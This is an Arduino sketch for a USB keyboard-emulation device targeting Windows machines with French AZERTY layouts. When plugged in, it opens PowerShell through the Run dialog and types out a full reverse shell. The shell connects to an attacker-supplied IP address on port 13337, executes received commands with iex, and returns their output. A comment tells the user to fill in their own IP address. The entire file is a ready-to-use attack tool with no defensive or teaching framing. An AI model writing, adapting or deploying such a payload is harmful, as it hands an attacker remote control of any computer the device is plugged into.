//This script works only for a computer configured for a Keyboard Azerty version France -- The Arduino Library of this keyboard is on https://github.com/martin-leo/KeyboardAzertyFr
#include <KeyboardAzertyFr.h>

void setup() {
  KeyboardAzertyFr.begin();
  delay(1000);

  KeyboardAzertyFr.press(0x83);
  delay(200);
  KeyboardAzertyFr.print("r");
  KeyboardAzertyFr.releaseAll();
  delay(300);

  KeyboardAzertyFr.print("powershell.exe");
  KeyboardAzertyFr.press(KEY_RETURN);
  delay(100);
  KeyboardAzertyFr.release(KEY_RETURN);
  delay(1000);

//Creating the Reverse Shell
  KeyboardAzertyFr.print("$client = New-Object System.Net.Sockets.TCPClient(\"IP_ADDRESS\",13337);$stream = $client.GetStream();");         //IN THIS LINE, YOU NEED TO CHANGE IP_ADDRESS !!!!!!!!!
  delay(50);
  
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("("); // --> "["
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print("byte");
  delay(50);

  
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("())"); // --> "[]["
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print("$bytes = 0..65535");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("-"); // --> "|"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  
  KeyboardAzertyFr.print("%");
  delay(50);


  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("'"); // --> "{"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print("0");
  delay(50);
  
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("="); // --> "}"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print(";while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)");
  delay(50);


  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("'"); // --> "{"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print(";$data = ");
  delay(50);
  
  KeyboardAzertyFr.print("(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 ");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("-"); // --> "|"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print(" Out-String );");
  delay(50);

  KeyboardAzertyFr.print("$sendback2 = $sendback ");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
  KeyboardAzertyFr.print("="); // --> "+"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print(" \"PS \" ");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
  KeyboardAzertyFr.print("="); // --> "+"
  KeyboardAzertyFr.releaseAll();
  delay(50);
  
  KeyboardAzertyFr.print(" (pwd).Path ");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
  KeyboardAzertyFr.print("="); // --> "+"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print(" \"> \";$sendbyte = (");
  delay(50);
  
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("("); // --> "["
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print("text.encoding");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print(")"); // --> "]"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print("::ASCII).GetBytes($sendback2);");
  delay(50);
  
  KeyboardAzertyFr.print("$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()");
  delay(50);

  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.print("="); // --> "}"
  KeyboardAzertyFr.releaseAll();
  delay(50);

  KeyboardAzertyFr.print(";$client.Close()");
  delay(50);

  
  KeyboardAzertyFr.press(KEY_RETURN);
  KeyboardAzertyFr.releaseAll();

//END OF CREATION REVERSE SHELL

  KeyboardAzertyFr.end();
}







void loop() {
  // put your main code here, to run repeatedly:

}
